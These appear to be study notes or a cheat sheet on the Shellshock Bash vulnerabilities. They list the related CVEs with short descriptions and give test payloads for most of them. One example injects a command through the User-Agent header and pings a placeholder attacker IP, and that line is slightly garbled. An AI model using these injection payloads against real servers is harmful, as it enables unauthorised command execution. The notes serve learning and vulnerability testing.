# ------------------------------- start shellshock overview ------------------------------- # 
    ==> Quick view: the vulnearbility was discoverd in Unix Bash Shell, and affected
    CGI programs on web servers, OpenSSH, DHCP Clients and several other attach vectors.

    the discovery of Shellshock resulted in serveral CVE's being assigned to different
    attack vectors:
        - CVE-2014-6271
        - CVE-2014-7169
        - .. and more
# -------------------------------   end shellshock overview ------------------------------- # 

# ------------------------------- start CVE ------------------------------- # 
    # ---------- |CVE-2014-6271| ---------- #
        ==> Quick View: This original form of the vulnerability involves a specially
        crafted environment variable containing an exported function definition, followed by arbitrary commands.
            Summary: Bash incorrectly executes the trailing commands when it imports the function.
            payload: env x='() { :;}; echo vulnerable' bash -c "echo this is a test"

            example: inject into user-agent
                User-Agent: () [:;]; ping -c 5 -p <attacker_ip>
    
    # ---------- |CVE-2014-6277| ---------- #
        ==> Quick View:  this vulnerability relates to the parsing of function definitions
        in environment variables by Bash, and can cause a segfault.
    
    # ---------- |CVE-2014-6278| ---------- #
        ==> Quick View: this relates to the parsing of function definitions in environment variables by Bash.

    # ---------- |CVE-2014-7169| ---------- #
        ==> Quick View: this relates to the parsing of function definitions in environment variables by Bash.
        payload: env X='() { (a)=>\' bash -c "echo date"; cat echo
                    ==> On a vulnerable system this would execute the command "date" unintentionally.
            $ X='() { (a)=>\' bash -c "echo date"
            bash: X: line 1: syntax error near unexpected token `='
            bash: X: line 1: `'
            bash: error importing function definition for `X'
            $ cat echo
            Fri Sep 26 01:37:16 UTC 2014
                ==> The system displays syntax errors, notifying the user that CVE-2014-6271 has been prevented,
                but still writes a file named 'echo', into the working directory, containing the result of the 'date' call.

    # ---------- |CVE-2014-7186| ---------- #
        ==> Quick View: which relates to an out-of-bounds memory access error in the Bash parser code.
            payload: bash -c 'true <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF <<EOF' ||
                     echo "CVE-2014-7186 vulnerable, redir_stack"
        
    # ---------- |CVE-2014-7187| ---------- #
        ==> Quick View: this is an off-by-one error in the Bash parser code, allowing out-of-bounds memory access.[
            payload: (for x in {1..200} ; do echo "for x$x in ; do :"; done; for x in {1..200} ; do echo done ; done) | bash ||
                     echo "CVE-2014-7187 vulnerable, word_lineno"
# -------------------------------   end CVE ------------------------------- # 